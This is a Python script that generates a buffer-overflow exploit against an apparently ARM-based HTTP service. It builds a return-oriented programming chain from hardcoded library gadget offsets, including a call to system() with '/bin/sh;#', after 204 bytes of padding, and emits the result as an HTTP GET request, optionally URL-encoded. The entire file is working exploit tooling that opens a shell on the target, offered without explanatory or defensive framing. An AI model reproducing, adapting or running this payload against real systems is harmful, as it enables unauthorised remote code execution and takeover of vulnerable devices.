#!env python
import struct
import sys
import argparse
import shlex
from urllib.parse import quote_from_bytes

parser = argparse.ArgumentParser()
parser.add_argument('--human', help='print overflow string human readable', action='store_true', default=False)
parser.add_argument('--plain', help='print plain overflow string', action='store_true', default=False)
parser.add_argument('--httpencode', help='HTTP encode overflow data (not pre_out() and post_out() data', action='store_true', default=False)
args = parser.parse_args()

# <I little endian unsigned integer
# adjust to your CPU arch
global fmt
fmt='<I'

# base address in the process memory of the library you want to use for your ROP chain
base=0xb6e83000

# how many bytes should we shift? memory: [shift*"A"+data()+lib(),...]
shift=204
shifter = [bytes(shift*'A','ascii'),'shifter']
shellcode = b''

def pre_out():
    print("GET ", end='')

def post_out():
    print(" HTTP/1.1\r\n\r\n\r\n", end='')

def data(data, cmt=''):
    return [struct.pack(fmt,data),cmt]

def lib(offset, cmt=''):
    return [struct.pack(fmt,base+offset),cmt]

def fromstring(data, cmt=''):
    return [bytearray(data,'ascii'), cmt]

def out(data):
    data = [d[0] for d in data]
    b = bytearray(b''.join(data))
    pre_out()
    sys.stdout.flush()
    if shellcode != '':
        for x in shellcode:
            b.append(x)
    if args.httpencode:
        b = quote_from_bytes(b)
        print(b, end='')
    if not args.httpencode:
        sys.stdout.buffer.write(b)
    sys.stdout.flush()
    post_out()
    sys.stdout.flush()

def out_plain(data):
    data = [d[0] for d in data]
    b = bytearray(b''.join(data))
    if shellcode != '':
        for x in shellcode:
            b.append(x)
    sys.stdout.buffer.write(b)
    sys.stdout.flush()

def out_human(data):
    pre_out()
    sys.stdout.flush()
    b = '['
    for d in data:
        b+='0x'+d[0].hex()+' = '+d[1]+'|'
    if shellcode != '':
        b += shellcode.hex()
    b += ']'
    print(b,end='')
    sys.stdout.flush()
    post_out()
    sys.stdout.flush()

if args.human:
    fmt = '>I'

overflow =  [
        shifter,
        lib(0x00035575,'pop {r0, r3, r4, pc}'),
        data(0xFFFFFFFF, 'junk r0'),
        lib(0x0003863c, 'system()'),
        data(0x04040404, 'junk r4'),
        lib(0x00107cb4, 'add r0, sp, #4; blx r3;'),
        #lib(0x0002cf6c, 'PC'),
        #lib(0x0003863c, 'R4'),
        data(0xFFFFFFFF,'junk'),
        fromstring("/bin/sh;#", 'binsh'),
        #data(0x6e69622f,'binsh'),
        #data(0x3b68732f,'binsh'),
        #data(0xFFFFFF23,'binsh'),
        ]

if args.human:
    out_human(overflow)
else:
    if args.plain:
        out_plain(overflow)
    else:
        out(overflow)
